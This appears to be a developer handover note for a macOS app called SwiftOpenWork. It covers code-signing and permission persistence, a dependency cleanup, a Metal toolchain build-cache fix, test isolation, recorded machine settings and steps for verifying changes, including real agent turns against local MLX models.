run once. TCC then keys on the certificate, so grants survive rebuilds. `codesign -dvvv` should
report `Authority=SwiftOpenWork Local Signing` (`OpenWork Local Signing` before the rename); if it says `Signature=adhoc`, the certificate is gone
and permissions will start decaying again.

**Changing to a stable certificate does not repair the existing entry** — the old grant points at
the old ad-hoc identity, so it must be removed and re-added once, after which it stays. In
macOS 26, Accessibility lives under **Privacy & Security › Device Control and Data Access**, not
a pane of its own.

**`swift-jinja` was declared and used by no target — and it was a version cap, not dead weight.**

Both manifests declared `swift-jinja` at `2.0.0..<2.4.0` while no target depended on it, which
is what the `dependency 'swift-jinja' is not used by any target` warning was about. Deleting it
is not obviously free: `swift-transformers` is the real consumer and declares `from: "2.0.0"`,
so the narrower range here was holding jinja down at **2.3.6** when 2.5.1 is published. Nothing
recorded why — it arrived inside a 1,000-file commit called "Update project configuration".

Checked before removing it, because Jinja is what `Tokenizers` uses to render **chat templates**,
which is every local MLX turn and something no unit test touches: forced to 2.5.1, the suite
passes and a real multi-turn MLX turn with a system prompt renders and answers correctly. So the
cap was not guarding a known break.

The declaration is gone from `Package.swift` and `project.yml`; **the resolved version is
deliberately left at 2.3.6** in both `Package.resolved` files. Jinja still builds and links
transitively through `Tokenizers`, so this changes nothing at runtime — bundling a dependency
bump into a warning fix would have been a separate decision wearing a cleanup's clothes.
**2.5.1 is verified good on this machine's model if anyone wants it**; that is a
`swift package update swift-jinja` away, and worth re-checking against a second model's chat
template first, since only Ornith's was exercised.

**`swift test` can fail with a missing `metal` compiler after a reboot.**

```
error: unable to spawn process '/var/run/com.apple.security.cryptexd/mnt/
com.apple.MobileAsset.MetalToolchain-v27.1.5194.15.EZDBV5/Metal.xctoolchain/usr/bin/metal'
```

The Metal toolchain is a cryptex whose mount point carries a random suffix that changes on
reboot, and XCBuild pins the old absolute path in its cached build description. `xcrun -f metal`
resolving fine while the build cannot spawn it is the tell. Clearing intermediates, `.build/out`
or the SwiftPM database does not help — the path lives here:

```bash
rm -rf .build/out/Intermediates.noindex/XCBuildData
```

**The project needs Xcode 26.6+ (Swift 6.3)** — `mlx-swift` declares
`swift-tools-version: 6.3;(experimentalCGen)`.

**A new source file needs `xcodegen generate`.** `Sources/Utils/AppLog.swift` was added this
pass; the `.xcodeproj` is tracked, so it must be regenerated and committed or the app target will
not compile the file even though `swift build` does.

**App Intents are validated at build time by the real app target, not by `swift build`.** A phrase
interpolating a `String` parameter is a halting error there and invisible to SwiftPM. After
touching `Sources/App/Intents`, run:

```bash
xcodegen generate && xcodebuild -project SwiftOpenWork.xcodeproj -scheme SwiftOpenWork build
```

**The test host is the real app, but no longer on your real data.** `xcodebuild test` launches
SwiftOpenWork.app. Since 2026-09-16, `StorageService` gives any XCTest process its own folder,
`$TMPDIR/SwiftOpenWork-tests-<pid>`, and removes folders left by earlier test processes that have
exited. A full `xcodebuild test` left `settings.json` and `sessions.json` unmodified. What is still
real under test: `UserDefaults` (window layout, update-check dates), the Keychain, and the home
folder. Anything started at launch must still check `AutomationScheduler.isHostedByTests`. For a
deliberate run on real data, such as a real agent turn, set
`SWIFTOPENWORK_DATA_DIRECTORY=~/Library/Application\ Support/SwiftOpenWork`. To smoke-test a build
without firing startup automations, launch the binary directly with `XCTestBundlePath=/dev/null`
in its environment.

**CI cancels superseded runs** (`cancel-in-progress: true`), which hides per-commit verification if
you are bisecting.

---

## Settings changed on this machine

Not in git, and **verified by reading `settings.json`, not remembered** — the previous version of
this table claimed `customMLXModelsDirectory` was `/Volumes/Models/Models` when the field was
actually empty, which is half of why local MLX appeared broken.

| Field | Actually reads | Note |
|---|---|---|
| `defaultProviderId` | `omlx-local` | The built-in in-process MLX engine. Routing is by `kind`, so the id drift against the seed's `builtin-mlx-local` does not matter. |
| `defaultModelId` | `mlx-community/Ornith-1.5-35B-A3B-8bit` | On disk, loads in ~3s. |
| `customMLXModelsDirectory` | `""` | Not load-bearing: `/Volumes/Models/Models` is found by the volume sweep. Set it only for a library somewhere else. |
| `customHFCachePath` | `""` | |
| `sandboxAgentFileSystem` | `false` | |
| `settingsSchemaVersion` | `2` | Stamped by the voice migration on 2026-09-15. Absent means 1. |
| `voiceInputEnabled` | `true` | Migrated from a stored `false` that no switch had ever controlled. |
| `voiceSynthesisEnabled` | `true` | As above. |
| `mlxGpuMemoryBudgetRatio` | `0.75` | Now load-bearing: it sets `MLX.Memory.cacheLimit` (72GB of 96GB here) and decides which models are badged as fitting. |

`providers.json`: two providers are enabled — `omlx-local` and `openrouter-cloud`. That pairing is
what made the default bug dangerous rather than merely wrong, because `openrouter-cloud` sits
*earlier* in the array and won the array-order fallback. Worth knowing if you disable `omlx-local`
while testing.

The model library on this machine is `/Volumes/Models/Models` (13 loadable bundles). Nothing is in
`~/.openwork/mlx_models/hub` — the abandoned 541MB partial Ornith download was deleted.

---

## Verifying a change

```bash
export DEVELOPER_DIR=/Applications/Xcode.app/Contents/Developer
SWIFT=/Applications/Xcode.app/Contents/Developer/Toolchains/XcodeDefault.xctoolchain/usr/bin/swift

$SWIFT test                    # 848 tests in two bundles; tests needing an uninstalled server or model, and the bundle-identity test, skip
$SWIFT build --product SwiftOpenWorkEngineTests && xcrun xctest .build/out/Products/Debug/SwiftOpenWorkEngineTests.xctest   # engine tests only: no MLX, no app
xcodegen generate              # after adding files — the .xcodeproj is tracked. Modules live in Package.swift; see README › Modules
xcodebuild -project SwiftOpenWork.xcodeproj -scheme SwiftOpenWork build   # App Intents metadata
Scripts/check-curated-models.sh   # after editing the curated model list
```

The fifth pass ran the suite through Xcode rather than SwiftPM, because several of its tests are
`@MainActor` and touch AppKit:

```bash
DEVELOPER_DIR=/Applications/Xcode.app/Contents/Developer \
  xcodebuild -scheme SwiftOpenWork -destination 'platform=macOS,arch=arm64' \
  CODE_SIGN_IDENTITY="-" CODE_SIGNING_ALLOWED=YES test
```

That last one is a script rather than a test because it asks a remote host what exists, and CI
should not go red because Hugging Face is rate-limiting. It is worth running periodically even
without a code change: five of the fifteen curated ids had rotted into 401s, so the app was
offering downloads that could not succeed.

A real agent turn against the local model, without the GUI, is the highest-signal check — drive
`AgentRunner.shared.run(...)` from a temporary test with the provider and model in settings. That
pattern found four bugs that unit tests could not, because each depended on the shape of real data:
promotion picking the wrong array, a 40KB catalog truncated before parsing, a string where a list
was expected, and a model id that matched no folder.

It is cheap now, so there is no excuse for skipping it. A bare `NativeMLXService.shared.streamChat`
against `mlx-community/Ornith-1.5-35B-A3B-8bit` completes in about 5s — the 35GB bundle is mmapped
off `/Volumes/Models/Models`, not read through. That check is what showed the discovery bug was
real rather than theoretical, and what proved the fix: before, the same call started a 37.7GB
download; after, it answers.

Two gotchas when reading the output of such a run:

- **`streamChat` hands you the raw stream.** Reasoning models put their chain of thought straight
  into `deltaText`, sometimes closed with a bare `</think>` and sometimes not closed at all. Run it
  through `AssistantContentSanitizer.splitThinking` before judging what the user would have seen —
  the app does, and text that looks like a leak in a raw harness is usually not one.
- **A model whose `config.json` this `mlx-swift-lm` cannot parse fails at load, not at discovery.**
  `OsaurusAI/Raptor-v0.5-8B-A1B-JANG_6M` resolves fine and then reports
  `Missing field 'quantization.per_tensor.group_size'`. That is the model, not the lookup.

Write its output to a file — `print` to a pipe is lost when MLX segfaults at exit. Delete the temp
test afterwards.

Two things that only a real run shows, both now fixed but worth knowing the shape of:

- **Wrap the run in `ToolApprovalManager.shared.withUnattendedApprovals`.** Without it the turn
  blocks forever the first time the model calls a writing tool, because nothing is on screen to
  approve it. A refused call still records the arguments the model produced, which is usually what
  you wanted to see anyway.
- **Local models send structured arguments in whatever shape they like.** The 35B model sent
  `multi_edit`'s `edits` as a JSON *string* rather than an array. Parsers for new tools should
  accept the obvious variants and reject the rest, rather than guessing.
